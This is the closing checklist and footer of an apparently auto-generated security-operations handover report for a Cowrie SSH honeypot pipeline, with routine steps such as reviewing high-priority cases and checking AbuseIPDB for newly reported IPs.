- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-18T21:16:34Z_
